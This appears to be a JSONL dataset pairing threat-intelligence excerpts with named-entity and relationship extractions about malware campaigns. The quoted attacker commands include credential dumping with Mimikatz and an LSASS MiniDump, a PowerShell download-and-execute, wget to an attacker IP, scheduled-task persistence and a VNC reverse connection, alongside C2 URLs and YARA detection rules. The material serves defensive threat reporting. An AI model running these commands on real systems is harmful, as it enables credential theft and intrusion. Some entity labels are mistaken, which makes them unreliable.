[TEMP]\\logexts.dat), ([TEMP]\\logexts.dat, hash, a6b9975bfe02432e80c7963147c4011a4f7cdb9baaee4ae8d27aaff7dff79c2b), (Trochilus dropper, drop, [TEMP]\\logexts.dll), ([TEMP]\\logexts.dll, hash, a73a4c0aa557241a09e137387537e04ce582c989caa10a6644d4391f00a836ef), (Trochilus dropper, drop, [TEMP]\\logger.dat), ([TEMP]\\logger.dat, hash, 10456bc3b5cfd2f1b1ab9c3833022ef52f5e9733d002ab237bdebad09b125024), (Trochilus dropper, drop, [TEMP]\\[RANDOM_DIGITS].doc), ([TEMP]\\[RANDOM_DIGITS].doc, hash, d295712185de2e5f8811b0ce7384a04915abdf970ef0f087c294bb00e340afad),  (LoadLibraryA, load, [TEMP]\\logexts.dll), ([TEMP]\\logexts.dll, loader, logexts.dll), (logexts.dll, check, WINLOGON.EXE), (logexts.dll, start, C:\\ProgramData\\Logger\\Logger.exe), (logexts.dll, construct, Logger.dat)"}
{"instruction": "calc.exe \"\"privilege::debug\"\" \"\"sekurlsa::logonpasswords full\" \" exit \" On April 26, further malicious activity occurred when the attackers ran the Crash Handler executable and installed a file called cal.exe (SHA256: 12534f7014b3338d8f9f86ff1bbeacf8c80ad03f1d0d19077ff0e406c58b5133) on the compromised machine. This file was LadonGo v3.8, a publicly available penetration testing framework that is written in Go. The attackers appear to have used LadonGo to scan the internal network for machines with RDP services running and attempted to exploit or log in to those machines using the credentials they stole several days earlier. There was also some evidence of brute-force login attempts against machines of interest.", "input": null, "output": "Named Entities: (calc.exe, file), (cal.exe, file), (12534f7014b3338d8f9f86ff1bbeacf8c80ad03f1d0d19077ff0e406c58b5133, SHA256), (LadonGo v3.8, tool), (Go, tool)\nRelationships: (attackers, installed, cal.exe), (cal.exe, hash, 12534f7014b3338d8f9f86ff1bbeacf8c80ad03f1d0d19077ff0e406c58b5133), (cal.exe, tool, LadonGo v3.8), (LadonGo v3.8, written in, Go), (attackers, used, LadonGo)"}
{"instruction": "On May 6, the attackers resumed their attack and ran the Crash Handler executable (this time named svchost.exe) and installed a new variant of Mimikatz named test.exe (SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9). This was likely done in order to obtain more credentials. The attackers then ran LadonGo and attempted to exploit a Netlogon vulnerability ( CVE-2020-1472 ) against two other computers in the organization in order to elevate privileges. On May 16, the attackers increased their level of activity and began moving laterally across the organization\u2019s network from the initially compromised computer (Computer #1). On a second computer (Computer #2), the attackers launched a command prompt and executed a variant of Mimikatz (file name: test.exe, SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9). The attackers then deployed a number of Knowledge Base files (e.g. kb0394623.exe) on the computer. These files are legitimate copies of the Windows command prompt (with 16 bytes of the rich header modified).", "input": null, "output": "Named Entities: (Crash Handler, tool), (svchost.exe, file), (Mimikatz, malware), (test.exe, file), (SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9, SHA256), (LadonGo, tool), (CVE-2020-1472, vulnerability), (kb0394623.exe, file)\n\nRelationships: (Crash Handler, named, svchost.exe), (svchost.exe, install, Mimikatz), (Mimikatz, name, test.exe), (test.exe, hash, 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9), (attackers, run, LadonGo), (LadonGo, exploit, CVE-2020-1472), (attackers, deploye, kb0394623.exe)"}
{"instruction": "On a third computer (Computer #3) the attackers used PsExec to execute the same older version of Crash Handler used on Computer #1, this time named javac.exe. A copy of this executable was then made to csidl_program_files\\windows mail\\winmailservice.exe and was executed. The attackers then ran dnscmd.exe (SHA256: 67877821bf1574060f4e45ab8be62e28f54fb40a23ce70b86a6369a4d63db5bc), which was used to enumerate DNS configuration information on the compromised computer: Dnscmd . /EnumZones Dnscmd is a Microsoft command-line tool for managing DNS servers. It can be used to script batch files to help automate routine DNS management tasks or to perform routine setup of new DNS servers. The enumzones command is used to list the zones that exist on the specified DNS server. If no filters are specified, a complete list of zones is returned.", "input": null, "output": "Named Entities: (PsExec, tool), (Crash Handler, file), (javac.exe, file), (csidl_program_files\\windows mail\\winmailservice.exe, file), (dnscmd.exe, tool), (67877821bf1574060f4e45ab8be62e28f54fb40a23ce70b86a6369a4d63db5bc, SHA256)\nRelationships: (PsExec, execute, Crash Handler), (Crash Handler, name, javac.exe), (javac.exe, copy to, csidl_program_files\\windows mail\\winmailservice.exe), (attackers, run, dnscmd.exe), (dnscmd.exe, hash, 67877821bf1574060f4e45ab8be62e28f54fb40a23ce70b86a6369a4d63db5bc)"}
{"instruction": "Crash Handler was then used to install imjpuex.exe in the csidl_common_appdata\\veritas directory which in turn was used to side-load a DLL file of the same name and load a .dat file to execute an unknown custom payload. Shortly after this, the attackers attempted to list the records of multiple specific zones by specifying the domain on the command line: Dnscmd . /ZonePrint [REDACTED_DOMAIN] On a fourth computer (Computer #4), the attackers used PsExec to execute Crash Handler (this time named test.exe). They then installed and executed two KB files in the %TEMP% directory. \u2022 SHA256: 5c4456f061ff764509a2b249f579a5a14d475c6714f714c5a45fdd67921b9fda \u2022 SHA256: ded734f79058c36a6050d801e1fb52cd5ca203f3fd6af6ddea52244132bd1b51 Again, both of these files were modified versions of the Windows command prompt. On May 17, the attackers deployed several more modified Windows command prompt applications on Computer #4. They also deployed the side-loading technique on Computer #5 to execute the legitimate svchost.exe application, possibly to facilitate some process injection.", "input": null, "output": "Named Entities: (Crash Handler, tool), (imjpuex.exe, file), (PsExec, tool), (test.exe, file), (5c4456f061ff764509a2b249f579a5a14d475c6714f714c5a45fdd67921b9fda, SHA256), (ded734f79058c36a6050d801e1fb52cd5ca203f3fd6af6ddea52244132bd1b51, SHA256), (svchost.exe, file)\nRelationships: (Crash Handler, install, imjpuex.exe), (Crash Handler,named, test.exe), (Crash Handler, execute, 5c4456f061ff764509a2b249f579a5a14d475c6714f714c5a45fdd67921b9fda), (Crash Handler, execute, ded734f79058c36a6050d801e1fb52cd5ca203f3fd6af6ddea52244132bd1b51), (attacker, execute, svchost.exe)"}
{"instruction": "Mimikatz is a go-to tool for most ransomware groups and Hive, Conti, and Avoslocker are no exception. We have observed them using the PowerShell version of Mimikatz as well as the PE version of the tool. There are also instances where the threat actors directly load the PowerShell version of Mimikatz from GitHub repositories: powershell IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/<redacted>/Invoke-Mimikatz.ps1'));Invoke-Mimikatz -DumpCreds In addition to using Mimikatz, the threat actors have also taken advantage of the native rundll32 and comsvcs.dll combination to dump the LSASS memory: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <process id> lsass.dmp full Adversaries also dump the SECURITY, SYSTEM, and SAM hives and later extract credentials from the dump. In rare occasions they have also been observed using taskmgr.exe to dump the LSASS memory and later using the dump to extract valuable credentials. Lateral Movement", "input": null, "output": "Named Entities: (Mimikatz, tool), (Hive, tool), (Conti, tool), (Avoslocker, tool), (https://raw.githubusercontent.com/<redacted>/Invoke-Mimikatz.ps1, URL), (comsvcs.dll, file), (rundll32.exe, file), (taskmgr.exe, file)\n\nRelationships: (Mimikatz, download from, https://raw.githubusercontent.com/<redacted>/Invoke-Mimikatz.ps1), (threat actor, use, comsvcs.dll), (comsvcs.dll, dump LSASS memory, rundll32.exe), (threat actor, use, taskmgr.exe)"}
{"instruction": "\"ct\" has value \"0\" \"bv\" has value \"v1.0.0\" The server has been observed to respond as follows: HTTP/1.1 200 OK Date: Fri, 28 Jan 2022 21:29:26 GMT Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked Connection: keep-alive CF-Cache-Status: DYNAMIC Expect-CT: max-age=604800, report-uri=\"hxxps://report-uri[.]cloudflare.com/cdn-cgi/beacon/expect-ct\" Report-To: {\"endpoints\":[{\"url\":\"hxxps:\\/\\/a.nel.cloudflare[.]com\\/report\\/v3?s=JE2u6s575flQq%2BEumTamotRln2IsYdLgqtQHy0tGJwQp9tuxhWThqxtCzsMG6vVgc%2Fa76jGYsP8hb68S3hKu8Q5lm6H2iIYElyVHw4WOcGSLqi%2FLR6AX5RcYlsXd\"}],\"group\":\"cf-nel\",\"max_age\":604800} NEL: {\"success_fraction\":0,\"report_to\":\"cf-nel\",\"max_age\":604800} Server: cloudflare CF-RAY: 6d4d50f69c993a8d-CDG alt-svc: h3=\":443\"; ma=86400, h3-29=\":443\"; ma=86400 98 Rc0OiT8tzq68CmJ7bi0SMLtCQQH8bjxlid0OONwvn+x9g2ku8Ocfx+lT+TZXBzLC9/K7hJ/efOYWz9e1HC3KrRkQoh3OTZezXIOhJ6gTRPiLeqDgCGT79FcFqm7SFEDPHl1NpR14dl/6R92VwKZE/A== 0 Where the response body can be decrypted as follows: newtask:1:Mw==:YUhSMGNITTZMeTlxYjI1aGRHaGhibWhoY21SM2FXTnJMbTFsTDJoaGNtUjNhV05yTG1waGNuNXpkR0Z5ZEE9PQ== The last term above contains the following string: hxxps://jonathanhardwick[.]me/hardwick.jar~start Some samples of the malware are seen communicating with the following servers: gaymers[.]ax 6f3af6ffb074513b51bba688a0b41df7[.]tk Communication between the malware and servers is over HTTP or HTTPS and this communication appears to culminate with victims being directed to connect to the following: POST /mafia/login.php HTTP/1.1 User-Agent: VerbleConnectTM Content-Type: application/x-www-form-urlencoded charset: utf-8 Cache-Control: no-cache Pragma: no-cache Host: gaymers.ax Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive Content-Length: 291 id=il~aSS_3ZNaXHMGXLExSyzp6xMrxMB7zCw1zFndLA87jjqd0tPsFqY31LF65YGEt&os=5i1E5v8J8fUqwpvNWkN6QQ&pv=6qWqTXHlWudJmSz_fuWcBA&ip=VfseCVZvINz5rCbXun59p", "input": null, "output": "Named Entities: (gaymers[.]ax, Domain), (6f3af6ffb074513b51bba688a0b41df7[.]tk, Domain), (hxxps://jonathanhardwick[.]me/hardwick.jar~start, URL)\nRelationships: No related entities and relations."}
{"instruction": "[+] iss = \"https://myvaccinerecord.cdph.ca.gov/creds\" [+] nbf = 1635982044 ==> TIMESTAMP = 2021-11-03 16:27:24 (UTC) [+] vc = JSON object: [+] type = \"['https://smarthealth.cards#health-card', 'https://smarthealth.cards#immunization', 'https://smarthealth.cards#covid19']\" [+] credentialSubject = {\"fhirVersion\": \"4.0.1\", \"fhirBundle\": {\"resourceType\": \"Bundle\", \"type\": \"collection\", \"entry\": [{\"fullUrl\": \"resource:0\", \"resource\": {\"resourceType\": \"Patient\", \"name\": [{\"family\": \"Doe\", \"given\": [\"John\"]}], \"birthDate\": \"1980-01-01\"}}, {\"fullUrl\": \"resource:1\", \"resource\": {\"resourceType\": \"Immunization\", \"status\": \"completed\", \"vaccineCode\": {\"coding\": [{\"system\": \"http://hl7.org/fhir/sid/cvx\", \"code\": \"208\"}]}, \"patient\": {\"reference\": \"resource:0\"}, \"occurrenceDateTime\": \"2021-03-01\", \"lotNumber\": \"EN6208\"}}, {\"fullUrl\": \"resource:2\", \"resource\": {\"resourceType\": \"Immunization\", \"status\": \"completed\", \"vaccineCode\": {\"coding\": [{\"system\": \"http://hl7.org/fhir/sid/cvx\", \"code\": \"208\"}]}, \"patient\": {\"reference\": \"resource:0\"}, \"occurrenceDateTime\": \"2021-04-01\", \"lotNumber\": \"ER8737\"}}]}}}} Token signature: YCeST7-YDMawwowswFx1R_TYg_5mDVsrSXqNLckdqCY5eNriEoUaSBSu7sCF8T", "input": null, "output": "Named Entities: (https://myvaccinerecord.cdph.ca.gov/creds, URL), (https://smarthealth.cards#health-card, URL), (https://smarthealth.cards#immunization, URL), (https://smarthealth.cards#covid19, URL)\nRelationships: No related entities and relations."}
{"instruction": "Attack chain for recent activity We did not observe what the initial infection vector was in this campaign, but it was likely a malicious URL spread via either spam email campaigns or through malvertising, which is typically the first step in Latin American banking Trojan campaigns. Victims are then directed to one of the following malicious URLs: hxxps://centreldaconsulta[.]com/ hxxps://www.centralcfconsulta[.]net/ hxxps://centralcfconsulta[.]net/index3.php?api=vFUMIfUzGz2QdjxTFKAMyTlh hxxps://centralcfconsulta.net/ hxxps://www.centralcfconsulta[.]net/index3.php?api=r0ubnHRxDycEy5uFPViNA55Y3t hxxps://www.centralcfconsulta[.]net/index3.php?api=4DQSbdp3hLqPRGTbOGtl7jCD9FKNViKXmKd9Lv hxxps://centreldaconsulta[.]com/index3.php?api=nJsdr1J3h0fsG18sRAVQt6JjVW hxxps://centreldaconsulta[.]com/index3.php?api=ThMyMCAQEOLIC9nO hxxps://www.centralcfconsulta[.]net/index3.php?api=wen1eIFCeUh0jAS3mWIDUhSLt3sXMQ Victims are then redirected to an Amazon Web Services (AWS) URL, which it appears the attackers abused to use as a command-and-control (C&C) server. A ZIP file that contains a Microsoft Software Installer (MSI) file is downloaded from the AWS infrastructure. ESET reported that most gangs deploying banking Trojans in Latin America had started using MSI files as an initial download in 2019. An MSI file can be used to install, uninstall, and update applications running on Windows systems.", "input": null, "output": "Named Entities: (Latin American banking Trojan, malware), (hxxps://centreldaconsulta[.]com/, URL), (hxxps://www.centralcfconsulta[.]net/, URL), (hxxps://centralcfconsulta[.]net/index3.php?api=vFUMIfUzGz2QdjxTFKAMyTlh, URL), (hxxps://centralcfconsulta.net/, URL), (hxxps://www.centralcfconsulta[.]net/index3.php?api=r0ubnHRxDycEy5uFPViNA55Y3t, URL), (hxxps://www.centralcfconsulta[.]net/index3.php?api=4DQSbdp3hLqPRGTbOGtl7jCD9FKNViKXmKd9Lv, URL), (hxxps://centreldaconsulta[.]com/index3.php?api=nJsdr1J3h0fsG18sRAVQt6JjVW, URL), (hxxps://centreldaconsulta[.]com/index3.php?api=ThMyMCAQEOLIC9nO, URL), (hxxps://www.centralcfconsulta[.]net/index3.php?api=wen1eIFCeUh0jAS3mWIDUhSLt3sXMQ, URL), (ESET, tool)\nRelationships: (Latin American banking Trojan, directed to, hxxps://centreldaconsulta[.]com/), (Latin American banking Trojan, directed to, hxxps://www.centralcfconsulta[.]net/), (Latin American banking Trojan, directed to, hxxps://centralcfconsulta[.]net/index3.php?api=vFUMIfUzGz2QdjxTFKAMyTlh), (Latin American banking Trojan, directed to, hxxps://centralcfconsulta.net/), (Latin American banking Trojan, directed to, hxxps://www.centralcfconsulta[.]net/index3.php?api=r0ubnHRxDycEy5uFPViNA55Y3t), (Latin American banking Trojan, directed to,hxxps://www.centralcfconsulta[.]net/index3.php?api=4DQSbdp3hLqPRGTbOGtl7jCD9FKNViKXmKd9Lv), (Latin American banking Trojan, directed to, hxxps://centreldaconsulta[.]com/index3.php?api=nJsdr1J3h0fsG18sRAVQt6JjVW), (Latin American banking Trojan, directed to, hxxps://centreldaconsulta[.]com/index3.php?api=ThMyMCAQEOLIC9nO), (Latin American banking Trojan, directed to, hxxps://www.centralcfconsulta[.]net/index3.php?api=wen1eIFCeUh0jAS3mWIDUhSLt3sXMQ)"}
{"instruction": "SCHTASKS /CREATE /sc minute /mo 12 /tn \\\"deep-versed\\\" /tr \\\"wscript.exe \\\"[%PUBLIC%]\\\\Pictures\\\\deep-versed.nls\\\" //e:VBScript //b\\\" /F The dropped file deep-versed.nls (817901df616c77dd1e5694e3d75aebb3a52464c23a06820517108c74edd07fbc) downloads a payload from a C&C server (deep-toned.chehalo.ru) and saves it as deep-green.exe in the following location: %PUBLIC%\\Downloads deep-green.exe The file deep-green.exe (1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f) contains an UltraVNC binary, which upon execution connects to a repeater (mucoris.ru:5612) using the following command line: -autoreconnect -id:%RANDOM% -connect mucoris.ru:5612 UltraVNC is an open-source remote-administration/remote-desktop-software utility. deep-green.exe A second file named deep-green.exe (f6c56a51c1f0139036e80a517a6634d4d87d05cce17c4ca5adc1055b42bf03aa) contain a Process Explorer (procexp) binary. Process Explorer is a freeware task manager and system monitor for Microsoft Windows. deep-green.exe A third file called deep-green.exe (de5a53a3b75e3e730755af09e3cacb7e6d171fc9b1853a7200e5dfb9044ab20a) is similar to descend.exe (0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137) just with different file names and C&C server (deer-lick.chehalo.ru). deep-green.exe The fourth and final file named deep-green.exe (d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7) drops a VBS file in the following location: %PUBLIC%\\Music\\ It then creates the following task:", "input": null, "output": "Named Entities: (SCHTASKS, tool), (deep-versed.nls, file), (817901df616c77dd1e5694e3d75aebb3a52464c23a06820517108c74edd07fbc, SHA256), (deep-green.exe, file), (1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f, SHA256), (UltraVNC, tool), (f6c56a51c1f0139036e80a517a6634d4d87d05cce17c4ca5adc1055b42bf03aa, SHA256), (procexp, tool), (de5a53a3b75e3e730755af09e3cacb7e6d171fc9b1853a7200e5dfb9044ab20a, SHA256), (d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7, SHA256)\nRelationships: (SCHTASKS, create, deep-versed.nls), (deep-versed.nls, hash, 817901df616c77dd1e5694e3d75aebb3a52464c23a06820517108c74edd07fbc), (deep-versed.nls, save as, deep-green.exe), (deep-green.exe, hash, 1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f), (deep-green.exe, tool, UltraVNC), (deep-green.exe, hash, f6c56a51c1f0139036e80a517a6634d4d87d05cce17c4ca5adc1055b42bf03aa), (deep-green.exe, tool, procexp), (deep-green.exe, hash, de5a53a3b75e3e730755af09e3cacb7e6d171fc9b1853a7200e5dfb9044ab20a), (deep-green.exe, hash, d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7)"}
{"instruction": "Custom Downloader - uses Microsoft infrastructure for its C&C activity Custom Screenshotter - periodically logs screenshots to a file Cobalt Strike Beacon - uses CloudFront infrastructure for its C&C activity (Cobalt Strike is an off-the-shelf tool that can be used to execute commands, inject other processes, elevate current processes, or impersonate other processes, and upload and download files) Metasploit - an off-the-shelf modular framework that can be used for a variety of malicious purposes on victim machines, including privilege escalation, screen capture, to set up a persistent backdoor, and more. The custom downloader used by the attackers leverages the Costura Assembly Loader. Once on a victim machine, it checks if the following file exists: [ARTEFACTS_FOLDER]\\winser.dll If the file does not exist it downloads a copy from the following URL: hxxps://outportal[.]azurewebsites.net/api/Values_V2/Getting3210 Next, the sample creates the following file if it does not exist: \"[ARTEFACTS_FOLDER]\\Microsoft Services[.]vbs\"", "input": null, "output": "Named Entities: (Custom Downloader, tool), (Custom Screenshotter, tool), (Cobalt Strike Beacon, tool), (Metasploit, tool), (Costura Assembly Loader, tool), ([ARTEFACTS_FOLDER]\\winser.dll, file), (hxxps://outportal[.]azurewebsites.net/api/Values_V2/Getting3210, URL)\nRelationships: (Custom Downloader, leverage, Costura Assembly Loader), (Custom Downloader, download, hxxps://outportal[.]azurewebsites.net/api/Values_V2/Getting3210), (Custom Downloader, check, [ARTEFACTS_FOLDER]\\winser.dll)"}
{"instruction": "Then it sets the following registry value to create a loadpoint: HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\"MicrosoftSystemServices\" = \"[ARTEFACTS_FOLDER]\\Microsoft Services[.]vbs\" Finally it opens an embedded web browser within its own UI using the following URL: hxxps://usedust[.]com While it initially appeared that this URL may have been a loadpoint for Backdoor.Graphon, upon further investigation it appears to be a decoy to confuse any affected users. Backdoor.Graphon is compiled as a .NET PE DLL with export \u201cMain\u201d and the following PDB file name: D:\\OfficeProjects\\Updated Working Due to Submission\\4.5\\Outlook_4.5\\Outlook 4.5.2 32 bit New without presistancy\\NPServices\\bin\\x86\\Debug\\NPServices[.]pdb When this is executed, it attempts to communicate with the attackers\u2019 C&C servers, which are hosted on Microsoft infrastructure. hxxps://microsoftmsdn[.]azurewebsites.net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID] hxxps://microsoftsgraphapi[.]azurewebsites.net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID] hxxps://msdnmicrosoft.azurewebsites[.]net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID] The attackers then run commands to control their input stream and capture the output and error streams. They also periodically send GET requests to the C&C server, with the content of any returned messages extracted and then deleted.", "input": null, "output": "Named Entities: (Backdoor.Graphon, malware), (MicrosoftSystemServices, tool), (hxxps://usedust[.]com, URL), (hxxps://microsoftmsdn[.]azurewebsites.net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID], URL), (hxxps://microsoftsgraphapi[.]azurewebsites.net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID], URL), (hxxps://msdnmicrosoft.azurewebsites[.]net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID], URL), (Microsoft infrastructure, tool)\nRelationships: (Backdoor.Graphon, loadpoint, MicrosoftSystemServices), (Backdoor.Graphon, decoy, hxxps://usedust[.]com), (Backdoor.Graphon, communicate with, Microsoft infrastructure), (MicrosoftSystemServices, URL, hxxps://usedust[.]com), (Backdoor.Graphon, communicate with, hxxps://microsoftmsdn[.]azurewebsites.net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID]), (Backdoor.Graphon, communicate with, hxxps://microsoftsgraphapi[.]azurewebsites.net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID]), (Backdoor.Graphon, communicate with, hxxps://msdnmicrosoft.azurewebsites[.]net/api/Values_V1/AuthAsyncComplete_V1?Identity=[INFECTION_ID])"}
{"instruction": "Attack chain Exchange servers are compromised through an as yet unidentified technique. On exploitation, the attacker executes a PowerShell command such as the following: powershell wget hxxp://209.14.0[.]234:46613/VcEtrKighyIFS5foGNXH Other powershell wget commands to the same IP address use similar seemingly random high port numbers. It is unknown exactly what is downloaded by the PowerShell command; however, the attackers maintain access on victim networks for at least several days before beginning the ransomware attack. Typically around 20 to 30 minutes prior to deploying ransomware, the attackers install a set of tools onto the compromised Exchange Server. Included in these tools is: An exploit for the CVE-2021-36942 vulnerability (aka PetitPotam). The code appears to be copied from https://github.com/zcgonvh/EfsPotato . This is in a file called \u201cefspotato.exe\u201d. Two files: active_desktop_render.dll and active_desktop_launcher.exe", "input": null, "output": "Named Entities: (powershell, tool), (hxxp://209.14.0[.]234:46613/VcEtrKighyIFS5foGNXH, URL), (CVE-2021-36942, vulnerability), (https://github.com/zcgonvh/EfsPotato, URL),  (efspotato.exe, file), (active_desktop_render.dll, file), (active_desktop_launcher.exe, file)\nRelationships: (attacker, execute, powershell), (powershell, wget, hxxp://209.14.0[.]234:46613/VcEtrKighyIFS5foGNXH), (attacker, exploit, CVE-2021-36942), (attacker, copy from, https://github.com/zcgonvh/EfsPotato), (https://github.com/zcgonvh/EfsPotato, copy, efspotato.exe), (efspotato.exe, has, active_desktop_render.dll), (efspotato.exe, has, active_desktop_launcher.exe)"}
{"instruction": "STOLEN CODE Byte-copy of machine code from pre-existing third-party components. The original code is distributed in compiled format only. Recompiled third-party source code. While both malware families are designed to deploy Cobalt Strike Beacon, there are differences in Cobalt Strike configuration. To date, Symantec has seen four samples of Raindrop. In three cases, Cobalt Strike was configured to use HTTPS as a communication protocol. In the fourth it was configured to use SMB Named Pipe as a communication protocol. All three Raindrop samples using HTTPS communication follow very similar configuration patterns as previously seen in one Teardrop sample (b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07). The most important similarities are highlighted below. TEARDROP SHA256 b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07 URLs https(://)infinitysoftwares(.)com/files/information_055.pdf https(://)infinitysoftwares(.)com/wp-admin/new_file.php POST FORM name=\"uploaded_1\";filename=\"33139.pdf\" Content-Type: text/plain RAINDROP SHA256 be9dbbec6937dfe0a652c0603d4972ba354e83c06b8397d6555fd1847da36725 URLs https(://)bigtopweb(.)com/files/page_306.pdf https(://)bigtopweb(.)com/wp-admin/admin-ajax.php POST FORM name=\"uploaded_1\";filename=\"84921.pdf\" Content-Type: text/plain RAINDROP SHA256 f2d38a29f6727f4ade62d88d8a68de0d52a0695930b8c92437a2f9e4de92e418 URLs https(://)panhardware(.)com/files/documentation_076.pdf https(://)panhardware(.)com/wp-admin/new_file.php POST FORM name=\"uploaded_1\";filename=\"18824.pdf\" Content-Type: text/plain", "input": null, "output": "Named Entities: (Raindrop, malware), (Teardrop, malware), (Cobalt Strike Beacon, tool), (b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07, SHA256), (https(://)infinitysoftwares(.)com/files/information_055.pdf, URL), (https(://)infinitysoftwares(.)com/wp-admin/new_file.php, URL), (be9dbbec6937dfe0a652c0603d4972ba354e83c06b8397d6555fd1847da36725, SHA256), (https(://)bigtopweb(.)com/files/page_306.pdf, URL), (https(://)bigtopweb(.)com/wp-admin/admin-ajax.php, URL), (f2d38a29f6727f4ade62d88d8a68de0d52a0695930b8c92437a2f9e4de92e418, SHA256), (https(://)panhardware(.)com/files/documentation_076.pdf, URL), (https(://)panhardware(.)com/wp-admin/new_file.php, URL)\nRelationships: (Raindrop, deploy, Cobalt Strike Beacon), (Raindrop, similar configuration, Teardrop), (Teardrop, sample hash, b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07), (Raindrop, sample hash, be9dbbec6937dfe0a652c0603d4972ba354e83c06b8397d6555fd1847da36725), (Teardrop, sample hash, f2d38a29f6727f4ade62d88d8a68de0d52a0695930b8c92437a2f9e4de92e418)"}
{"instruction": "All of the aforementioned domains use a common Registrar, NameSilo, LLC and, except for panhardware[.]com, which is currently sinkholed, have common name servers: ns1.dnsowl.com ns2.dnsowl.com ns3.dnsowl.com", "input": null, "output": "Named Entities: (panhardware[.]com, Domain), (ns1.dnsowl.com, Domain), (ns2.dnsowl.com, Domain), (ns3.dnsowl.com, Domain)\nRelationships: No related relations."}
{"instruction": "sample = \"cf23ea0d63b4c4c348865cefd70c35727ea8c82ba86d56635e488d816e60ea45x\" date = \"2023/06/01\" version = \"1\" strings: $head = \"<%@ Page\" $s1 = \"X-siLock-Comment\" $s2 = \"X-siLock-Step\" $s3 = \"Health Check Service\" $s4 = /pass, \\\"[a-z0-9]{8}-[a-z0-9]{4}/ $s5 = \"attachment;filename={0}\" condition: filesize > 5KB and filesize < 10KB and ( ($head in (0..50) and 2 of ($s*)) or (3 of ($s*)) ) } rule MOVEit_Transfer_exploit_webshell_aspx { meta: date = \"2023-06-01\" description = \"Detects indicators of compromise in MOVEit Transfer exploitation.\" author = \"Ahmet Payaslioglu - Binalyze DFIR Lab\" hash1 = \"44d8e68c7c4e04ed3adacb5a88450552\" hash2 = \"a85299f78ab5dd05e7f0f11ecea165ea\" reference1 = \"https://www.reddit.com/r/msp/comments/13xjs1y/tracking_emerging_moveit_transfer_critical/\" reference2 = \"https://www.bleepingcomputer.com/news/security/new-moveit-transfer-zero-day-mass-exploited-in-data-theft-attacks/\" reference3 = \"https://gist.github.com/JohnHammond/44ce8556f798b7f6a7574148b679c643\" verdict = \"dangerous\" mitre = \"T1505.003\" platform = \"windows\" search_context = \"filesystem\" strings: $a1 = \"MOVEit.DMZ\" $a2 = \"Request.Headers[\\\"X-siLock-Comment\\\"]\" $a3 = \"Delete FROM users WHERE RealName='Health Check Service'\" $a4 = \"set[\\\"Username\\\"]\" $a5 = \"INSERT INTO users (Username, LoginName, InstID, Permission, RealName\" $a6 = \"Encryption.OpenFileForDecryption(dataFilePath, siGlobs.FileSystemFactory.Create()\" $a7 = \"Response.StatusCode = 404;\" condition: filesize < 10KB", "input": null, "output": "Named Entities: (https://www.reddit.com/r/msp/comments/13xjs1y/tracking_emerging_moveit_transfer_critical/, URL), (https://www.bleepingcomputer.com/news/security/new-moveit-transfer-zero-day-mass-exploited-in-data-theft-attacks/, URL), (https://gist.github.com/JohnHammond/44ce8556f798b7f6a7574148b679c643, URL), (T1505.003, technique)\nRelationships: No related ralations."}
{"instruction": "Second-stage payload: Teardrop \nA second stage payload, a backdoor called Teardrop, is deployed against a targets of interest to the attackers. Symantec has observed two variants of Teardrop, both of which behave similarly and are used to deliver a further payload \u2013 the Cobalt Strike commodity malware. \nThe first variant (SHA256: b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07) is a DLL. The malicious code is contained in the export Tk_CreateImageType, ordinal 209. When executed, that malicious code reads a file named upbeat_anxiety.jpg from the current directory and ensures it has a jpg header. It will also check that the registry key HKCU\\Software\\Microsoft\\CTF exists. An embedded copy of Cobalt Strike is then extracted and executed. That CobaltStrike sample connects to infinitysoftwares[.]com for command and control. \nThe second variant (SHA256:1817a5bf9c01035bcf8a975c9f1d94b0ce7f6a200339485d8f93859f8f6d730c) is similar, except that the file it loads is called festive_computer.jpg. The embedded CobaltStrike payload connects to ervsystem[.]com for command and control.", "input": null, "output": "Named Entities: (Teardrop, malware), (Cobalt Strike, malware), (b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07, SHA256), (upbeat_anxiety.jpg, file), (infinitysoftwares[.]com, Domain), (1817a5bf9c01035bcf8a975c9f1d94b0ce7f6a200339485d8f93859f8f6d730c, SHA256), (festive_computer.jpg, file), (ervsystem[.]com, Domain)\nRelationships: (Teardrop, deploy, Cobalt Strike), (b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07, load, upbeat_anxiety.jpg), (1817a5bf9c01035bcf8a975c9f1d94b0ce7f6a200339485d8f93859f8f6d730c, load, festive_computer.jpg)"}
